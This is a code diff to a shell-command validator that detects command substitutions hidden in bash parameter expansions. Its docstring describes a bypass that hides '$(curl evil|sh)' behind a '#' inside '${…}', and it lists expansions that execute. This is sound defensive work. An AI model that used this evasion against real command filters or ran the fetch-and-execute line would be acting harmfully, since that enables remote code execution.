@@ -876,11 +876,39 @@ class SubstitutionValidator:
         instead of blanket-denying every expansion containing a ``$``.
 
         Node positions in the returned subtree are relative to the expansion body, not to the
-        outer command. Nothing on the validation path reads them; do not start.
+        outer command. Nothing on the validation path reads them — in particular do NOT wire
+        ``_find_outer_command`` (whose own docstring invites exactly that) into this path.
 
-        A body that carries an introducer but will not re-parse is reported as an
-        undeterminable substitution (-> default deny) rather than dropped: refusing to decode
-        an attack must not be the same as finding none.
+        THE RE-PARSE IS THE DANGEROUS PART, because the body's real lexical context is inside
+        ``${…}`` but bashlex is handed a command line. Two consequences, both found by the
+        LAB-1731 expert panel after both had already shipped as ALLOW/SAFE:
+
+        1. ``#`` opens a comment on a command line but is ordinary text inside ``${…}``, so a
+           naive re-parse discards the rest of the body — ``${z:- #$(curl evil|sh)}`` read as
+           clean while bash ran it. Blanking ``#`` costs nothing: it names no command, so a
+           mangled token can only become MORE unknown, and unknown is already deny.
+        2. Any other tokenization difference we have not enumerated fails the same way. So an
+           introducer we saw but could not decode into a substitution is DENIED, not dropped —
+           whether the re-parse raised or merely came back empty. Refusing to decode an attack
+           must not be indistinguishable from finding none. The empty-handed case is NOT
+           redundant with (1): an attacker can seed a whitelisted ``$(date)`` before the ``#``,
+           so "we decoded at least one substitution" is no evidence we decoded them all.
+
+        Verified against real bash: ${z:-$(id -u)}, ${z:-`id -u`} and ${a[$(echo 1)]} all
+        EXECUTE. <( ) and >( ) inside ${…} do NOT — bash passes that text through literally —
+        so treating them as introducers here is a deliberate over-block, kept because schlock
+        defaults to deny on ambiguity and other shells differ. Do not "fix" it into a silent
+        allow without re-checking every shell schlock claims to cover.
+
+        Two benign shapes are denied as collateral, deliberately, and are pinned by tests:
+        nested ``${a:-${b:-$(date)}}`` (bashlex truncates ``parameter.value`` at the first
+        ``}``, so the body never re-parses) and ``${z:-$((1+1))}`` (bashlex cannot parse
+        arithmetic at all — bare ``echo $((1+1))`` is already a hard block repo-wide, so this
+        is alignment, not a new cliff). Do not open either without a decoder for the real
+        grammar.
+
+        Cost: ~200us for an expansion that carries an introducer (a full bashlex re-parse) vs
+        ~3us for the substring scan that leaves the common case ($x, ${x:-plain}) untouched.
         """
         value = getattr(node, "value", None)
         if not isinstance(value, str) or not any(intro in value for intro in _SUBSTITUTION_INTRODUCERS):
@@ -889,11 +917,13 @@ class SubstitutionValidator:
 
         if depth < MAX_SUBSTITUTION_DEPTH:
             try:
-                inner_ast = self.parser.parse(value)
+                inner_ast = self.parser.parse(value.replace("#", "_"))
             except Exception as exc:  # noqa: BLE001 - any decode failure is treated as suspicious
                 logger.debug("Unparseable parameter expansion body %r: %s", value, exc)
             else:
-                return self.extract_substitutions(inner_ast, depth + 1)
+                decoded = self.extract_substitutions(inner_ast, depth + 1)
+                if decoded:
+                    return decoded
 
         return [
             SubstitutionNode(
